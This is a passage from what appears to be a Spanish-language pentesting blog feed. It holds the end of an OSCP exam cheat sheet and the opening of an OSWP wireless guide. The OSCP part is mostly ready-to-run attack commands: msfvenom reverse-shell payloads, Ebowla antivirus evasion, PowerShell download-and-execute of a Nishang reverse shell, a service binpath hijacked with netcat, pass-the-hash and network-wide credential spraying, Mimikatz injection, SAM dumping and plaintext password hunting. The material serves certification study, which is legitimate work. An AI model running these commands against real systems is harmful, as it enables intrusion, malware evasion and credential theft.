Directamente, veremos como se llevará a cabo una sincronización de recursos, creando una unidad lógica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lógica *_pwd_*, la cual sincroniza contra la unidad física donde se sitúa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.

En primer lugar, cambiamos de unidad lógica en la máquina Windows:

```bash
cd SharedFolder:
```

Posteriormente, nos traemos al equipo los recursos que consideremos:

```bash
move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
```

Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario _*accesschk_v5.02.exe*_:

```bash
$~ smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir
C:\DOCUME~1\ \\IP\parrotSmbFolder\accesschk_v5.02.exe -accepteula -uwqs &quot;usuario&quot; C:\*.*
```

Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.

#### AV Evasion Genetic Malware

A continuación, se detalla el procedimiento para crear **Malware Genético**, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.

Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), así como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.

Cuando todo esté preparado, una vez comprometida la máquina Windows, suponiendo para un caso práctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual será ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecución del binario, lo primero será crear nuestro Malware desde **msfvenom**:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe
```

Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la máquina Windows:

```bash
C:\Users\s4vitar\Desktop\ hostname
PC-S4vitar
```

Ya conociendo el **hostname**, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae **ebowla**. Abrimos en primer lugar el archivo _genetic.config_, cambiando las variables **output_type** y **payload_type** por las siguientes:

```bash
output_type = GO
payload_type = EXE
```

Una vez hecho, bajamos hasta la sección de variables de entorno:

```bash
    [[ENV_VAR]]

        username = ''
        computername = ''
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:


```bash
    [[ENV_VAR]]

        username = ''
        computername = 'PC-S4vitar'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a través de las propias variables de entorno. Esto quiere decir, que tras la ejecución del binario en la máquina comprometida, este se encargará de descifrar todo el ejecutable a través de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecución del binario no será funcional.

Una vez hecho, aplicamos el siguiente comando desde consola:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
└──╼ #python ebowla.py shell.exe genetic.config 
[*] Using Symmetric encryption
[*] Payload length 73802
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
	[-] environment value used: computername, value used: pc-s4vitar
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: pc-s4vitar
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9
[*] Writing GO payload to: go_symmetric_shell.exe.go
```

Este paso, lo que hará será crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
└──╼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy finalshell.exe to output
[*] Cleaning up
[*] Done

```

Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la máquina Windows.

Es importante que la ruta del binario **go** esté configurada en el _PATH_, pues en caso contrario no lo encontrará. Si queremos que funcione de manera temporal para la ejecución del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:

```bash
export PATH=/usr/local/go/bin:$PATH
```

Obviamente, cuantas más variables de entorno utilicemos mejor será nuestro _AV Evasion_.

#### Windows Port Forwarding

Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseña que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexión desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.

Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario **plink.exe** para llevar a cabo el procedimiento.

Lo único que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.

Cuando todo esté configurado correctamente, desde la máquina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra máquina local:

```bash
plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciónIP
```

Automáticamente, se entablará la conexión hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra máquina.

Ahora la idea es llevar a cabo la autenticación desde nuestra máquina al propio servicio local, el cual enruta al servicio samba de la máquina Windows. Suponiendo que la contraseña del usuario administrador es '**test123**', aplicamos el siguiente comando en local:

```bash
/usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe
```

Una vez aplicado el comando, veremos cómo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).

Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la máquina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.

Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:

```bash
cme smb ip --gen-relay-list ip
```

#### Hashdump Manual

Desde Metasploit, uno está acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, así como el auxiliar. A continuación se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.

Es tan sencillo como traerse con privilegios de administrador, los recursos **SAM** y **System** del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:

```bash
pwdump system SAM
```

Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer **PassTheHash**.

#### PassTheHash

A la hora de contar con un Hash NTLM válido de usuario, por ejemplo para este caso práctico, de Administrador, podemos llevar a cabo una autenticación contra el sistema a fin de conseguir una Shell interactiva a través del servicio Samba.

Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permite hacer conexiones como la siguiente:

```bash
pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe
```

Como es de obviar, este paso nos ahorra el tener que crackear la contraseña. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:

```bash
crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 
```

Obteniendo un **pwned** en caso de lograr la autenticación para algunos de los Hosts probados. A su vez, su uso puede ser útil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:

```bash
crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz
```

También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía **RDP**:

```bash
xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
```

#### Enumeration and Privilege Escalation

Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeración que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.

Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rápida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseñas en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el módulo y luego lo ejecutan... yo lo suelo hacer todo de una.

Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:

```bash
┌─[root@parrot]─[/opt/PowerSploit/Privesc]
└──╼ #cat PowerUp.ps1 | grep AllChecks  | grep &quot;function&quot; | tr -d '{'
function Invoke-AllChecks 

```

Para poder ejecutarla de un solo tirón, añadimos una llamada a dicha función al final de nuestro script:

```bash
# Últimas líneas del script

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']

Invoke-AllChecks
```

Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')
```

Esperamos unos segundos, y obtendremos directamente los resultados de la ejecución del script.

En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeración, donde se nos listarán en base al análisis efectuado un puñado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sólo que en este caso, la función a añadir en la última línea sería **Find-AllVulns**.

#### PowerShell Reverse Shell

Para los amantes de PowerShell que no viven sin su sesión PS, por aquí os explico una técnica para conseguir acceso al sistema con sesión PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.

Añadimos al final del script la siguiente línea:

`Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443`

Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por **Netcat** en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')
```

En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía **PowerShell**.

#### Manual Migration Process

Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darán montón de falsos positivos.

El saber con qué aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a través de las siguientes consultas:

`[Environment]::Is64BitOperatingSystem`

`[Environment]::Is64BitProcess`

Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:

```bash
C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')
```

Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.

#### RCE Filter Evasion Microsoft SQL

El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vía **sqsh** o a través del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.

En caso de contar con credenciales válidas, podemos realizar la autenticación al servicio via **sqsh** de la siguiente forma:

```bash
sqsh -S 192.168.1.X -U sa -P superPassword
```

En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parámetro **-P**.

Una vez conectados, podemos realizar las siguientes instrucciones:

```bash
1&gt; xp_cmdshell 'whoami'
2&gt;go

nt authority\ system
```

Puede ser que se de el caso donde tras lanzar la instrucción **go**, se nos presente un mensaje que nos avisa de que el componente está deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:

```bash
1&gt; EXEC SP_CONFIGURE 'show advanced options', 1
2&gt; reconfigure
3&gt; go
4&gt; EXEC SP_CONFIGURE 'xp_cmdhshell', 1
5&gt; reconfigure
6&gt; go
7&gt; xp_cmdshell &quot;whoami&quot;
8&gt; go

nt authority\ system
```

Y ya lograremos ejecutar comandos sobre el sistema.

#### mssqlclient Impacket

El recurso lo podemos obtener [aquí](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), y su uso es similar al de **psexec**. En mi caso, lo uso cuando han cambiado el puerto por defecto:

```bash
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.

#### Reconocimiento del Sistema

Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeración manual, redireccionando todo a un fichero de reportes:

```bash
 @echo --------- BASIC WINDOWS RECON ---------  &gt; report.txt
 timeout 1
 net config Workstation  &gt;&gt; report.txt
 timeout 1
 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; &gt;&gt; report.txt
 timeout 1
 hostname &gt;&gt; report.txt
 timeout 1
 net users &gt;&gt; report.txt
 timeout 1
 ipconfig /all &gt;&gt; report.txt
 timeout 1
 route print &gt;&gt; report.txt
 timeout 1
 arp -A &gt;&gt; report.txt
 timeout 1
 netstat -ano &gt;&gt; report.txt
 timeout 1
 netsh firewall show state &gt;&gt; report.txt
 timeout 1
 netsh firewall show config &gt;&gt; report.txt
 timeout 1
 schtasks /query /fo LIST /v &gt;&gt; report.txt
 timeout 1
 tasklist /SVC &gt;&gt; report.txt
 timeout 1
 net start &gt;&gt; report.txt
 timeout 1
 DRIVERQUERY &gt;&gt; report.txt
 timeout 1
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated &gt;&gt; report.txt
 timeout 1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated &gt;&gt; report.txt
 timeout 1
 dir /s *pass* == *cred* == *vnc* == *.config* &gt;&gt; report.txt
 timeout 1
 findstr /si password *.xml *.ini *.txt &gt;&gt; report.txt
 timeout 1
 reg query HKLM /f password /t REG_SZ /s &gt;&gt; report.txt
 timeout 1
 reg query HKCU /f password /t REG_SZ /s &gt;&gt; report.txt
 timeout 1
 dir &quot;C:\&quot;
 timeout 1
 dir &quot;C:\Program Files\&quot; &gt;&gt; report.txt
 timeout 1
 dir &quot;C:\Program Files (x86)\&quot;
 timeout 1
 dir &quot;C:\Users\&quot;
 timeout 1
 dir &quot;C:\Users\Public\&quot;
 timeout 1
 echo REPORT COMPLETE!
```

A su vez, podemos hacer del recurso [wmic-info](https://github.com/ankh2054/windows-pentest/blob/master/wmic-info) a fin de obtener información acerca del sistema.

Otra opción, es utilizar [icacls.bat](https://github.com/ankh2054/windows-pentest/blob/master/icacls.bat), para la enumeración de permisos débiles a nivel de sistema.

Una buena herramienta a utilizar para la enumeración de permisos débiles asignados sobre archivos que son ejecutados a través de tareas en intervalos regulares de tiempo es [schcheck.bat](https://github.com/ankh2054/windows-pentest/blob/master/schcheck.bat)

A continuación, se detallan algunos usos de *accesschk.exe*, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.

```bash

accesschk &quot;power users&quot; c:\windows\system32
accesschk users -cw *
accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
accesschk.exe -uwcqv adam.dale *
accesschk.exe -ucqv NetLogon
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
accesschk -kns austin\mruss hklm\software
accesschk -k hklm\software
accesschk -e -s c:\users\mark
accesschk -wuo everyone \basednamedobjects
```

#### Kernel Exploits Windows

A continuación, se enumeran distintos exploits de Kernel interesantes a usar que en más de una ocasión han funcionado en las máquinas del lab. Así mismo es recomendable llevarlos siempre bajo la manga:

* [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
* [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
* [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)

#### Privilege Escalation Enumerations

A continuación, se detalla una enumeración básica del sistema.

**Información Básica**

```bash
systeminfo
hostname
```

**¿Quiénes somos?**

```bash
whoami
echo %username%
```

**¿Qué usuarios y grupos locales existen en el sistema?**

```bash
net users
net localgroups
```

**Enumerar información de usuario, interesante para ver si el usuario posee privilegios**

```bash
net user usuario
```

**Ver grupos de Dominio**

```bash
net group /domain
```

**Ver miembros del Domain Group**

```bash
net group /domain &lt;Group Name&gt;
```

**Firewall**

```bash
netsh firewall show state
netsh firewall show config
```

**Network**

```bash
ipconfig /all
route print
arp -A
```

**¿Cómo de bien está parcheado el sistema?**

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Búsqueda de Contraseñas en Texto Claro sobre el Sistema**

```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /spin &quot;password&quot; *.*
findstr /spin &quot;password&quot; *.*
```

**Búsqueda de Contraseñas en Texto Claro sobre Archivos**

Es probable que nos las encontremos en Base64:

```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

**Búsqueda de Contraseñas en Texto Claro Almacenadas en Registro**

```bash
# VNC
reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;

# Windows autologin
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;

# SNMP Paramters
reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;

# Putty
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

# Búsqueda de Contraseñas almacenadas en Registro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Scheduled Tasks**

```bash
schtasks /query /fo LIST /v &gt; schtasks.txt
cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM
```

**Cambio de binario para el servicio upnp**

```bash
sc config upnphost binpath= &quot;C:\Inetpub\nc.exe 192.168.1.X 6666 -e c:\Windows\system32\cmd.exe&quot;
sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
sc config upnphost depend= &quot;&quot;
```

**Búsqueda de Permisos Débiles**

```bash
wmic service list brief

# El comando anterior generará montón de contenido, por lo tanto, una buena práctica es parsear los resultados. Lo hacemos en los siguiente pasos.

for /f &quot;tokens=2 delims='='&quot; %a in ('wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt

for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;

sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt

# Procesamos a continuación cada uno de los resultados obtenidos vía cacls

cacls &quot;C:\path\to\file.exe&quot;
```

En este paso siempre vamos a estar interesados en el Output _BUILTIN\Users:(F)_, o que nuestro usuario cuente con los permisos _(F)_ o _(C)_:

```bash
C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
```

Esto querá decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiéndonos de esta forma incrustrar un ejecutable malicioso. 

A continuación, se representa un ejemplo de código en C para un simple **getsuid**:

```bash
#include &lt;stdlib.h&gt;
int main ()
{
int i;
    i = system(&quot;net localgroup administrators theusername /add&quot;);
return 0;
}
```

Compilamos el mismo haciendo uso de la siguiente sintáxis:

```bash
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vía **wmic** o **net**, de la siguiente forma:

```bash
wmic service NAMEOFSERVICE call startservice

net stop [service name] &amp;&amp; net start [service name].
```

**Unquoted Service Paths**

Esta técnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:

```bash
# Usando WMIC
wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;

# Usando sc
sc query
sc qc service name
```

Si la ruta de alguno de los servicios listados contienen un espacio y no están doblemente encomillados, el servicio es vulnerable.

Suponiendo que la ruta fuera esta a modo de ejemplo:

```bash
c:\Program Files\something\winamp.exe
```

Podríamos depositar un binario tal que así:

```bash
c:\program.exe
```

Tras reiniciar el servicio, lo que sucederá es que tomará como binario a ejecutar el situado en **c:\program.exe** en vez del que debería, permitiendo así llevar a cabo una ejecución con posibilidad de alto privilegio sobre el mismo.

**Módulos interesantes de Post-Explotación desde Metasploit**

```bash
use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
```</content><author><name>J0hnTena</name></author><category term="OSCP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSCP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">Preparación OSWP</title><link href="http://localhost:4000/oswp-preparacion/" rel="alternate" type="text/html" title="Preparación OSWP" /><published>2020-02-04T00:00:00-06:00</published><updated>2020-02-04T00:00:00-06:00</updated><id>http://localhost:4000/oswp-preparacion</id><content type="html" xml:base="http://localhost:4000/oswp-preparacion/"># Preparación para el OSWP (by s4vitar)

![OSWP Image](https://funkyimg.com/i/2VTJW.jpg)
#### Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet

&lt;br&gt;
Esta guía es la misma que tengo publicada en mi Gist:

* [https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb](https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb)

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Estructura de los apuntes](#estructura-de-los-apuntes)
     * [Redes WPA](#redes-wpa)
       * [Conceptos básicos](#conceptos-básicos)
       * [Modo monitor](#modo-monitor)
       * [Configuración de la tarjeta de red y tips](#configuración-de-la-tarjeta-de-red-y-tips)
       * [Análisis del entorno](#análisis-del-entorno)
       * [Modos de filtro](#modos-de-filtro)
       * [Exportación de evidencias](#exportación-de-evidencias)
       * [Concepto de Handshake](#concepto-de-handshake)
       * [Técnicas para capturar un Handshake](#técnicas-para-capturar-un-handshake)
            * [Ataque de Deautenticación dirigido](#ataque-de-deautenticación-dirigido)
            * [Ataque de Deautenticación global (Broadcast MAC Address)](#ataque-de-deautenticación-global)
            * [Ataque de Autenticación](#ataque-de-autenticación)
            * [CTS Frame Attack - Secuestro del Ancho de Banda](#cts-frame-attack)
            * [Beacon Flood Mode Attack](#beacon-flood-mode-attack)
            * [Disassociation Amok Mode Attack](#disassociation-amok-mode-attack)
            * [Michael Shutdown Exploitation](#michael-shutdown-exploitation)
            * [Técnicas pasivas](#técnicas-pasivas)
        * [Validación del Handshake con Pyrit](#validación-del-handshake-con-pyrit)
        * [Tratamiento y filtro de la captura](#tratamiento-y-filtro-de-la-captura)
        * [Parseador para redes del entorno](#parseador-para-redes-del-entorno)
        * [Análisis de paquetes de red con Tshark](#análisis-de-paquetes-de-red-con-tshark)
        * [Extracción del hash en el Handshake](#extracción-del-hash-en-el-handshake)
        * [Fuerza bruta con John](#fuerza-bruta-con-john)
        * [Fuerza bruta con Aircrack](#fuerza-bruta-con-aircrack)
        * [Fuerza bruta con Hashcat](#fuerza-bruta-con-hashcat)
        * [Proceso de ataque con Bettercap](#proceso-de-ataque-con-bettercap)
        * [Técnicas de aumento de la velocidad de cómputo](#técnicas-de-aumento-de-la-velocidad-de-cómputo)
            * [Concepto de Rainbow Table](#concepto-de-rainbow-table)
            * [Cracking con Pyrit](#cracking-con-pyrit)
            * [Cracking con Cowpatty](#cracking-con-cowpatty)
            * [Cracking con Airolib](#cracking-con-airolib)
            * [Rainbow Table con GenPMK](#rainbow-table-con-genpmk)
            * [Cracking con Cowpatty frente a Rainbow Table](#cracking-con-cowpatty-frente-a-rainbow-table)
            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
            * [Cracking con Pyrit a través de ataque por base de datos](#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos)
        * [Técnicas de espionaje](#técnicas-de-espionaje)
            * [Uso de Airdecap para el desencriptado de paquetes](#uso-de-airdecap-para-el-desencriptado-de-paquetes)
            * [Análisis del desencriptado con Tshark y Wireshark](#análisis-del-desencriptado-con-tshark-y-wireshark)
            * [Espionaje con Ettercap Driftnet y enrutamiento con iptables](#espionaje-con-ettercap-driftnet-y-enrutamiento-con-iptables)
        * [Ataques graciosos](#ataques-graciosos)
            * [Reemplazado de imágenes web](#reemplazado-de-imágenes-web)
            * [Ataque Shaking Web](#ataque-shaking-web)
        * [Evil Twin Attack](#evil-twin-attack)
           * [Creación de fichero DHCP](#creación-de-fichero-dhcp)
           * [Configuración de página web](#configuración-de-página-web)
           * [Inicialización de servicios](#inicialización-de-servicios)
           * [Creación de base de datos via MYSQL](#creación-de-base-de-datos-via-mysql)
           * [Creación de falso punto de acceso via Airbase](#creación-de-falso-punto-de-acceso-via-airbase)
           * [Creación de interfaz y asignación de segmentos](#cración-de-interfaz-y-asignación-de-segmentos)
           * [Control y creación de reglas de enrutamiento por iptables](#control-y-creación-de-reglas-de-enrutamiento-por-iptables)
           * [Sincronización de reglas definidas con el Fake AP](#sincronización-de-reglas-definidas-con-el-fake-ap)
           * [Robo de datos](#robo-de-datos)
        * [Ataque a redes sin clientes](#ataque-a-redes-sin-clientes)
            * [Clientless PKMID Attack](#clientless-pkmid-attack)
                * [Ataque desde Bettercap](#ataque-desde-bettercap)
                * [Ataque via hcxdumptool](#ataque-via-hcxdumptool)
                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
        * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Wifimosys](#uso-de-wifimosys)
        * [Redes WPA Ocultas](#redes-wpa-ocultas)       
    * [Redes WEP](#redes-wep)
        * [Fake Authentication Attack](#fake-authentication-attack) 
        * [ARP Replay Attack](#arp-replay-attack) 
        * [Chop Chop Attack](#chop-chop-attack) 
        * [Fragmentation Attack](#fragmentation-attack) 
        * [SKA Type Cracking](#ska-type-cracking) 

            
       

Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le
sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

![Certificado Físico](https://funkyimg.com/i/2VTgJ.jpeg)

A diferencia del OSCP, encontré bastante sencillo el curso, pero todo tiene su explicación. 

Cuando empecé con el Hacking, lo primero que toqué fue la parte WiFi, por lo que esta parte la tenía más que
controlada antes de empezar. En cuanto a aprendizaje, aprendí una o dos cosas nuevas, lo cual es
excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarqué mucho más temario
del que presentaba el curso.

Por ello hago este Gist, no sólo para comentar las técnicas que necesitáis tener controladas, sino para
